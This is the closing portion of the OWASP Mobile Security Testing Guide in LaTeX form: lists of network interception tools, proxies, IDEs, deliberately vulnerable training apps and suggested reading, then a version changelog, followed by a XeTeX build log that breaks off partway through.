\hypertarget{tools-for-network-interception-and-monitoring}{%
\subsubsection{Tools for Network Interception and
Monitoring}\label{tools-for-network-interception-and-monitoring}}

\begin{itemize}
\tightlist
\item
  bettercap: A powerful framework which aims to offer to security
  researchers and reverse engineers an easy to use, all-in-one solution
  for Wi-Fi, Bluetooth Low Energy, wireless HID hijacking and Ethernet
  networks reconnaissance and MITM attacks -
  \url{https://www.bettercap.org/}
\item
  Canape: A network testing tool for arbitrary protocols -
  \url{https://github.com/ctxis/canape}
\item
  Mallory: A Man in The Middle Tool (MiTM) that is used to monitor and
  manipulate traffic on mobile devices and applications -
  \url{https://github.com/intrepidusgroup/mallory}
\item
  MITM Relay: A script to intercept and modify non-HTTP protocols
  through Burp and others with support for SSL and STARTTLS interception
  - \url{https://github.com/jrmdev/mitm_relay}
\item
  tcpdump: A command line packet capture utility -
  \url{https://www.tcpdump.org/}
\item
  Wireshark: An open-source packet analyzer -
  \url{https://www.wireshark.org/download.html}
\end{itemize}

\hypertarget{interception-proxies}{%
\subsubsection{Interception Proxies}\label{interception-proxies}}

\begin{itemize}
\tightlist
\item
  Burp Suite: An integrated platform for performing security testing of
  applications - \url{https://portswigger.net/burp/download.html}
\item
  Charles Proxy: HTTP proxy / HTTP monitor / Reverse Proxy that enables
  a developer to view all of the HTTP and SSL / HTTPS traffic between
  their machine and the Internet - \url{https://www.charlesproxy.com}
\item
  Fiddler: An HTTP debugging proxy server application which captures
  HTTP and HTTPS traffic and logs it for the user to review -
  \url{https://www.telerik.com/fiddler}
\item
  OWASP Zed Attack Proxy (ZAP): A free security tool which helps to
  automatically find security vulnerabilities in web applications and
  web services - \url{https://github.com/zaproxy/zaproxy}
\item
  Proxydroid: Global Proxy App for Android System -
  \url{https://github.com/madeye/proxydroid}
\end{itemize}

\hypertarget{ides}{%
\subsubsection{IDEs}\label{ides}}

\begin{itemize}
\tightlist
\item
  Android Studio: The official IDE for Google's Android operating
  system, built on JetBrains' IntelliJ IDEA software and designed
  specifically for Android development -
  \url{https://developer.android.com/studio/index.html}
\item
  IntelliJ IDEA: A Java IDE for developing computer software -
  \url{https://www.jetbrains.com/idea/download/}
\item
  Eclipse: Eclipse is an IDE used in computer programming, and is the
  most widely used Java IDE - \url{https://eclipse.org/}
\item
  Xcode: The official IDE to create apps for iOS, watchOS, tvOS and
  macOS. It's only available for macOS -
  \url{https://developer.apple.com/xcode/}
\end{itemize}

\hypertarget{vulnerable-applications}{%
\subsubsection{Vulnerable applications}\label{vulnerable-applications}}

The applications listed below can be used as training materials. Note:
only the MSTG apps and Crackmes are tested and maintained by the MSTG
project.

\hypertarget{android-1}{%
\paragraph{Android}\label{android-1}}

\begin{itemize}
\tightlist
\item
  Crackmes: A set of apps to test your Android application hacking
  skills -
  \url{https://github.com/OWASP/owasp-mstg/tree/master/Crackmes}
\item
  AndroGoat: An open source vulnerable/insecure app using Kotlin. This
  app has a wide range of vulnerabilities related to certificate
  pinning, custom URL schemes, Android Network Security Configuration,
  WebViews, root detection and over 20 other vulnerabilities -
  \url{https://github.com/satishpatnayak/AndroGoat}
\item
  DVHMA: A hybrid mobile app (for Android) that intentionally contains
  vulnerabilities - \url{https://github.com/logicalhacking/DVHMA}
\item
  Digitalbank: A vulnerable app created in 2015, which can be used on
  older Android platforms -
  \url{https://github.com/CyberScions/Digitalbank}
\item
  DIVA Android: An app intentionally designed to be insecure which has
  received updates in 2016 and contains 13 different challenges -
  \url{https://github.com/payatu/diva-android}
\item
  DodoVulnerableBank: An insecure Android app from 2015 -
  \url{https://github.com/CSPF-Founder/DodoVulnerableBank}
\item
  InsecureBankv2: A vulnerable Android app made for security enthusiasts
  and developers to learn the Android insecurities by testing a
  vulnerable application. It has been updated in 2018 and contains a lot
  of vulnerabilities -
  \url{https://github.com/dineshshetty/Android-InsecureBankv2}
\item
  MSTG Android app: Java - A vulnerable Android app with vulnerabilities
  similar to the test cases described in this document -
  \url{https://github.com/OWASP/MSTG-Hacking-Playground/tree/master/Android/MSTG-Android-Java-App}
\item
  MSTG Android app: Kotlin - A vulnerable Android app with
  vulnerabilities similar to the test cases described in this document -
  \url{https://github.com/OWASP/MSTG-Hacking-Playground/tree/master/Android/MSTG-Android-Kotlin-App}
\end{itemize}

\hypertarget{ios-1}{%
\paragraph{iOS}\label{ios-1}}

\begin{itemize}
\tightlist
\item
  Crackmes: A set of applications to test your iOS application hacking
  skills -
  \url{https://github.com/OWASP/owasp-mstg/tree/master/Crackmes}
\item
  Myriam: A vulnerable iOS app with iOS security challenges -
  \url{https://github.com/GeoSn0w/Myriam}
\item
  DVIA: A vulnerable iOS app written in Objective-C which provides a
  platform to mobile security enthusiasts/professionals or students to
  test their iOS penetration testing skills -
  \url{http://damnvulnerableiosapp.com/}
\item
  DVIA-v2: A vulnerable iOS app, written in Swift with over 15
  vulnerabilities - \url{https://github.com/prateek147/DVIA-v2}
\item
  iGoat: An iOS Objective-C app serving as a learning tool for iOS
  developers (iPhone, iPad, etc.) and mobile app pentesters. It was
  inspired by the WebGoat project, and has a similar conceptual flow to
  it - \url{https://github.com/owasp/igoat}
\item
  iGoat-Swift: A Swift version of original iGoat project -
  \url{https://github.com/owasp/igoat-swift}
\item
  UnSAFE Bank: UnSAFE Bank is a core virtual banking application
  designed with the aim to incorporate the cybersecurity risks and
  various test cases such that newbie, developers, and security analysts
  can learn, hack and improvise their vulnerability assessment and
  penetration testing skills. -
  \url{https://github.com/lucideus-repo/UnSAFE_Bank}
\end{itemize}

\hypertarget{suggested-reading}{%
\subsection{Suggested Reading}\label{suggested-reading}}

\hypertarget{mobile-app-security}{%
\subsubsection{Mobile App Security}\label{mobile-app-security}}

\hypertarget{android-2}{%
\paragraph{Android}\label{android-2}}

\begin{itemize}
\tightlist
\item
  Dominic Chell, Tyrone Erasmus, Shaun Colley, Ollie Whitehous (2015)
  \emph{Mobile Application Hacker's Handbook}. Wiley. Available at:
  \url{https://www.wiley.com/en-us/The+Mobile+Application+Hacker\%27s+Handbook-p-9781118958506}
\item
  Joshua J. Drake, Zach Lanier, Collin Mulliner, Pau Oliva, Stephen A.
  Ridley, Georg Wicherski (2014) \emph{Android Hacker's Handbook}.
  Wiley. Available at:
  \url{https://www.wiley.com/en-us/Android+Hacker\%27s+Handbook-p-9781118608647}
\item
  Godfrey Nolan (2014) \emph{Bulletproof Android}. Addison-Wesley
  Professional. Available at:
  \url{https://www.amazon.com/Bulletproof-Android-Practical-Building-Developers/dp/0133993329}
\item
  Nikolay Elenkov (2014) \emph{Android Security Internals: An In-Depth
  Guide to Android's Security Architecture}. No Starch Press. Available
  at: \url{https://nostarch.com/androidsecurity}
\item
  Jonathan Levin (2015) \emph{Android Internals :: A confectioners
  cookbook - Volume I: The power user's view}. Technologeeks.com.
  Available at: \url{http://newandroidbook.com/}
\end{itemize}

\hypertarget{ios-2}{%
\paragraph{iOS}\label{ios-2}}

\begin{itemize}
\tightlist
\item
  Charlie Miller, Dionysus Blazakis, Dino Dai Zovi, Stefan Esser,
  Vincenzo Iozzo, Ralf-Philipp Weinmann (2012) \emph{iOS Hacker's
  Handbook}. Wiley. Available at:
  \url{https://www.wiley.com/en-us/iOS+Hacker\%27s+Handbook-p-9781118204122}
\item
  David Thiel (2016) \emph{iOS Application Security, The Definitive
  Guide for Hackers and Developers}. no starch press. Available at:
  \url{https://www.nostarch.com/iossecurity}
\item
  Jonathan Levin (2017), \emph{Mac OS X and iOS Internals}, Wiley.
  Available at: \url{http://newosxbook.com/index.php}
\end{itemize}

\hypertarget{misc}{%
\paragraph{Misc}\label{misc}}

\hypertarget{reverse-engineering-2}{%
\subsubsection{Reverse Engineering}\label{reverse-engineering-2}}

\begin{itemize}
\tightlist
\item
  Bruce Dang, Alexandre Gazet, Elias Backaalany (2014) \emph{Practical
  Reverse Engineering}. Wiley. Available at:
  \url{https://www.wiley.com/en-us/Practical+Reverse+Engineering\%3A+x86\%2C+x64\%2C+ARM\%2C+Windows+Kernel\%2C+Reversing+Tools\%2C+and+Obfuscation-p-9781118787311}
\item
  Skakenunny, Hangcom \emph{iOS App Reverse Engineering}. Online.
  Available at: \url{https://github.com/iosre/iOSAppReverseEngineering/}
\item
  Bernhard Mueller (2016) \emph{Hacking Soft Tokens - Advanced Reverse
  Engineering on Android}. HITB GSEC Singapore. Available at:
  \url{http://gsec.hitb.org/materials/sg2016/D1\%20-\%20Bernhard\%20Mueller\%20-\%20Attacking\%20Software\%20Tokens.pdf}
\item
  Dennis Yurichev (2016) \emph{Reverse Engineering for Beginners}.
  Online. Available at: \url{https://beginners.re/}
\item
  Michael Hale Ligh, Andrew Case, Jamie Levy, Aaron Walters (2014)
  \emph{The Art of Memory Forensics.} Wiley. Available at:
  \url{https://www.wiley.com/en-us/The+Art+of+Memory+Forensics\%3A+Detecting+Malware+and+Threats+in+Windows\%2C+Linux\%2C+and+Mac+Memory-p-9781118825099}
\item
  Jacob Baines (2016) \emph{Programming Linux Anti-Reversing
  Techniques}. Leanpub. Available at:
  \url{https://leanpub.com/anti-reverse-engineering-linux}
\end{itemize}

\hypertarget{changelog}{%
\section{Changelog}\label{changelog}}

This document is automatically generated at \{\{gitbook.time\}\}

\hypertarget{v1.2---14-may-2020}{%
\subsection{v1.2 - 14 May 2020}\label{v1.2---14-may-2020}}

95 issues were closed since the last release. A full overview can be
seen in Github Issues
\url{https://github.com/OWASP/owasp-mstg/issues?q=is\%3Aissue+is\%3Aclosed+closed\%3A2019-08-03..2020-05-12+}.

191 pull requests were merged since the last release. A full overview
can be seen in Github Pull Requests
\url{https://github.com/OWASP/owasp-mstg/pulls?q=is\%3Apr+is\%3Aclosed+closed\%3A2019-08-03..2020-05-12+}

Major changes include:

\begin{itemize}
\tightlist
\item
  References of OWASP Mobile Top 10 and MSTG-IDs are completely moved to
  MASVS
\item
  Reworking of information gathering (static analysis) for Android Apps
\item
  Update of Biometric Authentication for Android Apps
\item
  New content and updates in the Android and iOS Reverse Engineering and
  Tampering chapters
\item
  3 new iOS Reverse Engineering test cases
\item
  Translations of the MSTG are linked to the respective forks but are
  not part of the MSTG anymore
\item
  Updated English, Japanese, French, Korean and Spanish checklists to be
  compatible with MSTG 1.2
\item
  Updated Acknowledgments, with 1 new co-author and contributor
\item
  Added JNI Tracing for Android
\item
  Added dsdump for dumping Objective-C and Swift content
\item
  Added the procedure to sign the debugserver for iOS 12 and higher
\item
  Added dependency-check to verify for vulnerabilities in libraries
  added by iOS package managers
\item
  Added getppid as debugger detection (iOS)
\item
  Added Domain/URL Enumeration in APKs
\item
  Added introduction into Network.framework (iOS)
\item
  Added UnSAFE Bank iOS Application
\item
  Added information on SECCOMP (Android)
\item
  Added native and java method tracing (Android)
\item
  Added Android library injection
\item
  Added Android 10 TLS and cryptography updates
\item
  Updated code obfuscation for Android and iOS
\item
  Added test case for Reverse Engineering Tools Detection -
  MSTG-RESILIENCE-4 (iOS)
\item
  Added test case for Emulator Detection - MSTG-RESILIENCE-5 (iOS)
\item
  Added an example with truststore to bypass cert pinning (Android)
\item
  Added content to information gathering using frida (Android)
\item
  Added RandoriSec and OWASP Bay area as sponsor
\item
  Added basic information gathering for Android and iOS
\item
  Added Simulating a Man-in-the-Middle Attack with an Access Point
\item
  Added gender neutrality to the MSTG
\item
  Extended section about dealing with Xamarin Apps
\item
  Updated all picture links to img tag
\item
  Updated iTunes limitations and usage since macOS Catalina
\item
  Added Emulation-based Analysis (iOS and Android)
\item
  Added Debugging iOS release applications using lldb
\item
  Added Korean translation of the checklist
\item
  Updated symbolic execution content (Android)
\item
  Added Ghidra for Android Reverse Engineering
\item
  Added section on Manual (Reversed) Code Review for iOS
\item
  Added explanation of more Frida APIs (iOS and Android)
\item
  Added Apple CryptoKit
\item
  Updated and simplified Frida detection methods
\item
  Added introduction to setup and disassembling for iOS Apps
\item
  Updated section about frida-ios-dump
\item
  Added gplaycli (Android)
\item
  Extended section on how to retrieve UDI (iOS)
\item
  Added new companies in the Users.md list with companies applying the
  MSTG/MASVS
\item
  Updated code samples to Swift 5
\item
  Adding Process Exploration (Android and iOS)
\item
  Updated best practices for passwords, added ``Have I Been Pwned''
\item
  Updated SSL Pinning fallback methods
\item
  Updated app identifier (Android and iOS)
\item
  Updated permission changes for Android O, P and Q
\item
  Updated Broadcast Receiver section (Android)
\end{itemize}

Several other minor updates include fixing typos and markdown lint
errors and updating outdated links.

\hypertarget{v1.1.3---2-august-2019}{%
\subsection{v1.1.3 - 2 August 2019}\label{v1.1.3---2-august-2019}}

\begin{itemize}
\tightlist
\item
  Updated Acknowledgments, with 2 new co-authors.
\item
  Translated various parts into Japanese.
\item
  A large restructuring of the general testing, platform specific
  testing and reverse-engineering chapters.
\item
  Updated description of many tools: Adb, Angr, APK axtractor, Apkx,
  Burp Suite, Drozer, ClassDump(Z/etc), Clutch, Drozer, Frida, Hopper,
  Ghidra, IDB, Ipa Installer, iFunBox, iOS-deploy, KeychainDumper,
  Mobile-Security-Framework, Nathan, Needle, Objection, Magisk,
  PassionFruit, Radare 2, Tableplus, SOcket CAT, Xposed, and others.
\item
  Updated most of the iOS hacking/verification techniques using iOS 12
  or 11 as a base instead of iOS 9/10.
\item
  Removed tools which were no longer updated, such as introspy-Android
  and AndBug.
\item
  Added missing MASVS references from version 1.1.4: v1.X, V3.5, V5.6,
  V6.2-V6.5, V8.2-V8.6.
\item
  Rewrote device-binding explanation and testcases for Android.
\item
  Added parts on testing unmanaged code in Objective-C, Java, and C/C++.
\item
  Applied many spelling, punctuation and style-related fixes.
\item
  Updated many cryptography related parts.
\item
  Added testaces for upgrade-mechanism verification for apps.
\item
  Updated Readme, Code of Conduct, Contribution guidelines,
  verification, funding link, and generation scripts.
\item
  Added ISBN as the book is now available at Hulu.
\item
  Added various fixes for the .epub format.
\item
  Added testcases on Android and iOS backup verification.
\item
  Improved key-attestation related explanation for Android.
\item
  Restructured OWASP Mobile Wiki.
\item
  Removed Yahoo Weather app and simplified reference on using SQL
  injection.
\item
  Improve explanation for iOS app sideloading to include various
  available methods.
\item
  Added explanation on using ADB and device shell for Android.
\item
  Added explanation on using device shell for iOS.
\item
  Provided comparison for using emulators/simulators and real devices
  for iOS/Android.
\item
  Fixed Uncrackable Level 3 for Android.
\item
  Improved explanation on how to exfiltrate data and apps on iOS 12 and
  Android 8.
\item
  Improved/updated explanation on SSL-pinning.
\item
  Added list of adopters of the MASVS/MSTG.
\item
  Updated English, Japanese, French and Spanish checklists to be
  compatible with MSTG 1.1.2.
\item
  Added a small write-up on Adiantum for Google.
\item
  Added MSTG-ID to the paragraphs to create a link between MSTG
  paragraphs and MASVS requirements.
\item
  Added review criteria for Android instant apps and guidance for
  app-bundle evaluation.
\item
  Clarified the differences between various methods of dynamic analysis.
\end{itemize}

\hypertarget{v1.1.2---12-may-2019}{%
\subsection{v1.1.2 - 12 May 2019}\label{v1.1.2---12-may-2019}}

\begin{itemize}
\tightlist
\item
  Added missing mappings for MASVS V1.X.
\item
  Updated markdown throughout the English MSTG to be consistent.
\item
  Replaces some dead links.
\item
  Improvements for rendering as a book, including the ISBN number.
\item
  Updated the Excel: it is now available in Japanese as well!
\item
  Many punctuation corrections, spelling and grammar issues resolved.
\item
  Added missing iOS test case regarding memory corruption issues.
\item
  Added contributing, code of conduct, markdown linting and dead link
  detection.
\end{itemize}

\hypertarget{v1.1.1---7-may-2019}{%
\subsection{v1.1.1 - 7 May 2019}\label{v1.1.1---7-may-2019}}

\begin{itemize}
\tightlist
\item
  Improvements on various tool related parts, such as how to use
  on-device console, adb, nscurl, Frida and Needle.
\item
  Updated 0x4e regarding SMS communication.
\item
  Many grammar/style updates.
\item
  Added Android description regarding MASVS requirement 7.8.
\item
  Updated contributor list.
\item
  Various updates on instructions regarding TLS and encryption.
\item
  Removed some erroneous information.
\item
  Fixed parts of the alignment of the MASVS requirements with the MSTG.
\item
  Updated information on various topics such as jailbreaking and network
  interception on both iOS and Android.
\item
  Added some steps for Frida detection.
\item
  Added write-ups on Android changes, regarding permissions, application
  signing, device identifiers, key attestation and more.
\item
  Extended guidance on SafetyNet attestation.
\item
  Added information on Magisk.
\item
  Added Firebase misconfiguration information.
\item
  Added references to more testing tools.
\item
  Updated contributor list.
\item
  Added a lot of information to iOS platform testing.
\item
  Added a lot of fixes for our book-release.
\end{itemize}

\hypertarget{v1.1.0---30-nov-2018}{%
\subsection{v1.1.0 - 30 Nov 2018}\label{v1.1.0---30-nov-2018}}

\begin{itemize}
\tightlist
\item
  Added more samples in Kotlin.
\item
  Simplified leanpub and gitbook publishing.
\item
  A lot of QA improvements.
\item
  Added deserialization test cases for iOS, including input
  sanitization.
\item
  Added test cases regarding device-access-security policies and data
  storage on iOS.
\item
  Added test cases regarding session invalidation.
\item
  Improved cryptography and key management test cases on both Android
  and iOS.
\item
  Started adding various updates in the test cases introduced by Android
  Oreo and Android Pie.
\item
  Refreshed the Testing Tools section: removed some of the lesser
  maintained tools, added new tools.
\item
  Fixed some of the markdown issues.
\item
  Updated license to CC 4.0.
\item
  Started Japanese translation.
\item
  Updated references to OWASP Mobile Top 10.
\item
  Updated Android Crackmes.
\item
  Fixed some of the anti-reverse-engineering test cases.
\item
  Added debugging test case for iOS.
\end{itemize}

\hypertarget{v1.0.2---13-oct-2018}{%
\subsection{v1.0.2 - 13 Oct 2018}\label{v1.0.2---13-oct-2018}}

\begin{itemize}
\tightlist
\item
  Updated guiding documentation (README).
\item
  Improved automated build of the pdf, epub and mobi.
\item
  Updated Frontispiece (given new contributor stats).
\item
  Added attack surface sections for Android and various.
\item
  Added vulnerable apps for testing skills.
\item
  Improved sections for testing App permissions for Android (given
  android Oreo/Pie), added section for testing permissions on iOS.
\item
  Added fix for Fragment Injection on older Android versions.
\item
  Improved sections on iOS WebView related testing.
\end{itemize}

\hypertarget{v1.0.1---17-sept-2018}{%
\subsection{v1.0.1 - 17 Sept 2018}\label{v1.0.1---17-sept-2018}}

\begin{itemize}
\tightlist
\item
  Updated guiding documentation (README, PR templates, improved style
  guide, issue templates).
\item
  Added automated build of the pdf and DocX.
\item
  Updated Frontispiece (given new contributor stats).
\item
  Updated Crackmes and guiding documentation.
\item
  Updated tooling commands (adb, ABE, iMazing, Needle, IPAinstaller,
  etc.).
\item
  Added first Russian translations of the 1.0 documents for iOS.
\item
  Improved URLs for GitBook using goo.gl in case of URLs with odd
  syntax.
\item
  Updated Frontispiece to give credit to all that have helped out for
  this version.
\item
  Clarified the app taxonomy \& security testing sections by a rewrite.
\item
  Added sections for network testing, certificate verification \& SSL
  pinning for Cordova, WebView, Xamarin, React-Native and updated the
  public key pinning sections.
\item
  Removed no longer working guides (e.g.~using iTunes to install apps).
\item
  Updated a lot of URLs (using TLS wherever possible).
\item
  Updated tests regarding WebViews.
\item
  Added new testing tool suites in the tools section, such as the mobile
  hack tools and various dependency checkers.
\item
  Updated test cases regarding protocol handlers (added missing MASVS
  6.6 for iOS).
\item
  Many small updates in terms of wording, spelling/typos, updated code
  segments and grammar.
\item
  Added missing test cases for MASVS 2.11, 4.7, 7.5 and 4.11.
\item
  Updated the XLS Checklist given MASVS 1.1.0.
\item
  Removed the clipboard test from iOS and Android.
\item
  Removed duplicates on local storage testing and updated data storage
  test cases.
\item
  Added write-ups from the mobile security sessions at the OWASP summit.
\item
  Added anti-debugging bypass section for iOS.
\item
  Added SQL injection \& XML injection samples and improved mitigation
  documentation.
\item
  Added Needle documentation for iOS.
\item
  Added fragment injection documentation.
\item
  Updated IPA installation process guidance.
\item
  Added XSS sample for Android.
\item
  Added improved documentation for certificate installation on Android
  devices.
\item
  Updated Frida \& Fridump related documentation.
\item
  Added sections about in-memory data analysis in iOS.
\item
  Updated software development and related supporting documentation.
\item
  Updated (anti) reverse-engineering sections for Android and iOS.
\item
  Updated data storage chapters given newer tooling.
\item
  Merged SDLC and security testing chapters.
\item
  Updated cryptography and key-management testing sections for both
  Android and iOS (up to Android Nougat/iOS 11).
\item
  Updated general overview chapters for Android and iOS.
\item
  Updated Android and iOS IPC testing.
\item
  Added missing overviews, references, etc. to various sections such as
  0x6i.
\item
  Updated local authentication chapters and the authentication \&
  session management chapters.
\item
  Updated test cases for sensitive data in memory.
\item
  Added code quality sections.
\end{itemize}

\hypertarget{v1.0---15-jun-2018-first-release}{%
\subsection{v1.0 - 15 Jun 2018 (First
release)}\label{v1.0---15-jun-2018-first-release}}

\end{document}

[makePDF] Run #1
This is XeTeX, Version 3.14159265-2.6-0.99996 (TeX Live 2016/Debian) (preloaded format=xelatex)
 restricted \write18 enabled.
entering extended mode
(/tmp/tex2pdf.-b81d3c9506d190f0/input.tex
LaTeX2e <2017/01/01> patch level 3
Babel <3.9r> and hyphenation patterns for 37 language(s) loaded.
(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrartcl.cls
Document Class: scrartcl 2016/06/14 v3.21 KOMA-Script document class (article)
(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrkbase.sty
(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrbase.sty
(/usr/share/texlive/texmf-dist/tex/latex/graphics/keyval.sty)
(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrlfile.sty
Package scrlfile, 2016/06/14 v3.21 KOMA-Script package (loading files)
                  Copyright (C) Markus Kohm

))) (/usr/share/texlive/texmf-dist/tex/latex/koma-script/tocbasic.sty)

Class scrartcl Warning: You've used obsolete option `tablecaptionabove'.
(scrartcl)              Usage of this option indicates an old document
(scrartcl)              and changes compatibility level using
(scrartcl)              `captions=tableheading,version=first,
(scrartcl)              enabledeprecatedfontcommands' that may result
(scrartcl)              in further warnings.
(scrartcl)              If you don't want this, you should simply
(scrartcl)              replace option `tablecaptionabove' by `captions=tablehe
ading'.


Class scrartcl Warning: deprecated option `enabledeprecatedfontcommands'.
(scrartcl)              Note, that this option was already depreacted when
(scrartcl)              it has been defined. Support for old font commands
(scrartcl)              has been removed from KOMA-Script more than one
(scrartcl)              decade ago. It is not recommended to use them any
(scrartcl)              longer. Therefore usage of this class option also
(scrartcl)              is not recommended.

(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrsize11pt.clo)
(/usr/share/texlive/texmf-dist/tex/latex/koma-script/typearea.sty
Package typearea, 2016/06/14 v3.21 KOMA-Script package (type area)
                  Copyright (C) Frank Neukam, 1992-1994
                  Copyright (C) Markus Kohm, 1994-

)) (/usr/share/texmf/tex/latex/lm/lmodern.sty)
(/usr/share/texlive/texmf-dist/tex/latex/setspace/setspace.sty)
(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/amssymb.sty
(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/amsfonts.sty))
(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsmath.sty
For additional information on amsmath, use the `?' option.
(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amstext.sty
(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsgen.sty))
(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsbsy.sty)
(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsopn.sty))
(/usr/share/texlive/texmf-dist/tex/generic/ifxetex/ifxetex.sty)
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/ifluatex.sty)
(/usr/share/texlive/texmf-dist/tex/latex/unicode-math/unicode-math.sty
(/usr/share/texlive/texmf-dist/tex/latex/l3kernel/expl3.sty
(/usr/share/texlive/texmf-dist/tex/latex/l3kernel/expl3-code.tex)
(/usr/share/texlive/texmf-dist/tex/latex/l3kernel/l3xdvipdfmx.def))
(/usr/share/texlive/texmf-dist/tex/latex/ucharcat/ucharcat.sty)
(/usr/share/texlive/texmf-dist/tex/latex/l3packages/xparse/xparse.sty)
(/usr/share/texlive/texmf-dist/tex/latex/l3packages/l3keys2e/l3keys2e.sty)
(/usr/share/texlive/texmf-dist/tex/latex/fontspec/fontspec.sty
(/usr/share/texlive/texmf-dist/tex/latex/fontspec/fontspec-xetex.sty
(/usr/share/texlive/texmf-dist/tex/latex/base/fontenc.sty
(/usr/share/texlive/texmf-dist/tex/latex/base/tuenc.def))
(/usr/share/texlive/texmf-dist/tex/latex/fontspec/fontspec.cfg)))
(/usr/share/texlive/texmf-dist/tex/latex/base/fix-cm.sty
(/usr/share/texlive/texmf-dist/tex/latex/base/ts1enc.def))
(/usr/share/texlive/texmf-dist/tex/latex/filehook/filehook.sty
(/usr/share/texlive/texmf-dist/tex/latex/filehook/filehook-scrlfile.sty))
(/usr/share/texlive/texmf-dist/tex/latex/unicode-math/unicode-math-xetex.sty
(/usr/share/texlive/texmf-dist/tex/latex/unicode-math/unicode-math-table.tex)))
 (/usr/share/texlive/texmf-dist/tex/latex/upquote/upquote.sty
(/usr/share/texlive/texmf-dist/tex/latex/base/textcomp.sty
(/usr/share/texlive/texmf-dist/tex/latex/base/ts1enc.def)))
(/usr/share/texlive/texmf-dist/tex/latex/microtype/microtype.sty
(/usr/share/texlive/texmf-dist/tex/latex/microtype/microtype-xetex.def)
(/usr/share/texlive/texmf-dist/tex/latex/microtype/microtype.cfg))
(/usr/share/texlive/texmf-dist/tex/latex/xcolor/xcolor.sty
(/usr/share/texlive/texmf-dist/tex/latex/graphics-cfg/color.cfg)
(/usr/share/texlive/texmf-dist/tex/latex/graphics-def/xetex.def)
(/usr/share/texlive/texmf-dist/tex/latex/colortbl/colortbl.sty
(/usr/share/texlive/texmf-dist/tex/latex/tools/array.sty))
(/usr/share/texlive/texmf-dist/tex/latex/graphics/dvipsnam.def)
(/usr/share/texlive/texmf-dist/tex/latex/xcolor/svgnam.def)
(/usr/share/texlive/texmf-dist/tex/latex/xcolor/x11nam.def))
(/usr/share/texlive/texmf-dist/tex/latex/oberdiek/bookmark.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/pdfescape.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/ltxcmds.sty)
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/pdftexcmds.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/infwarerr.sty)
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/ifpdf.sty)))
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/ifvtex.sty)
(/usr/share/texlive/texmf-dist/tex/latex/hyperref/hyperref.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/hobsub-hyperref.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/hobsub-generic.sty))
(/usr/share/texlive/texmf-dist/tex/latex/oberdiek/auxhook.sty)
(/usr/share/texlive/texmf-dist/tex/latex/oberdiek/kvoptions.sty)
(/usr/share/texlive/texmf-dist/tex/latex/hyperref/pd1enc.def)
(/usr/share/texlive/texmf-dist/tex/latex/latexconfig/hyperref.cfg)
(/usr/share/texlive/texmf-dist/tex/latex/hyperref/puenc.def)
(/usr/share/texlive/texmf-dist/tex/latex/url/url.sty))

Package hyperref Message: Driver (autodetected): hxetex.

(/usr/share/texlive/texmf-dist/tex/latex/hyperref/hxetex.def
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/stringenc.sty)
(/usr/share/texlive/texmf-dist/tex/latex/oberdiek/rerunfilecheck.sty))
(/usr/share/texlive/texmf-dist/tex/latex/oberdiek/bkm-dvipdfm.def))
(/usr/share/texlive/texmf-dist/tex/latex/geometry/geometry.sty)
(/usr/share/texlive/texmf-dist/tex/latex/fancyvrb/fancyvrb.sty
Style option: `fancyvrb' v2.7a, with DG/SPQR fixes, and firstline=lastline fix 
<2008/02/07> (tvz))
(/usr/share/texlive/texmf-dist/tex/latex/fvextra/fvextra.sty
(/usr/share/texlive/texmf-dist/tex/latex/base/ifthen.sty)
(/usr/share/texlive/texmf-dist/tex/latex/etoolbox/etoolbox.sty)
(/usr/share/texlive/texmf-dist/tex/latex/lineno/lineno.sty))
(/usr/share/texlive/texmf-dist/tex/latex/tools/longtable.sty)
(/usr/share/texlive/texmf-dist/tex/latex/booktabs/booktabs.sty)
(/usr/share/texlive/texmf-dist/tex/latex/footnotehyper/footnotehyper.sty
(/usr/share/texlive/texmf-dist/tex/latex/mdwtools/footnote.sty))
(/usr/share/texlive/texmf-dist/tex/latex/footnotebackref/footnotebackref.sty)
(/usr/share/texlive/texmf-dist/tex/latex/graphics/graphicx.sty
(/usr/share/texlive/texmf-dist/tex/latex/graphics/graphics.sty
(/usr/share/texlive/texmf-dist/tex/latex/graphics/trig.sty)
(/usr/share/texlive/texmf-dist/tex/latex/graphics-cfg/graphics.cfg)))
(/usr/share/texlive/texmf-dist/tex/latex/oberdiek/grffile.sty)
(/usr/share/texlive/texmf-dist/tex/latex/float/float.sty)
(/usr/share/texlive/texmf-dist/tex/latex/sectsty/sectsty.sty

LaTeX Warning: Command \underbar  has changed.
               Check if current package is valid.

) (/usr/share/texlive/texmf-dist/tex/latex/incgraph/incgraph.sty
(/usr/share/texlive/texmf-dist/tex/latex/pgf/utilities/pgfkeys.sty
(/usr/share/texlive/texmf-dist/tex/generic/pgf/utilities/pgfkeys.code.tex
(/usr/share/texlive/texmf-dist/tex/generic/pgf/utilities/pgfkeysfiltered.code.t
ex))) (/usr/share/texlive/texmf-dist/tex/latex/pgf/basiclayer/pgf.sty
(/usr/share/texlive/texmf-dist/tex/latex/pgf/utilities/pgfrcs.sty
(/usr/share/texlive/texmf-dist/tex/generic/pgf/utilities/pgfutil-common.tex
(/usr/share/texlive/texmf-dist/tex/generic/pgf/utilities/pgfutil-common-lists.t
ex)) (/usr/share/texlive/texmf-dist/tex/generic/pgf/utilities/pgfutil-latex.def
(/usr/share/texlive/texmf-dist/tex/latex/ms/everyshi.sty))
(/usr/share/texlive/texmf-dist/tex/generic/pgf/utilities/pgfrcs.code.tex))
(/usr/share/texlive/texmf-dist/tex/latex/pgf/basiclayer/pgfcore.sty
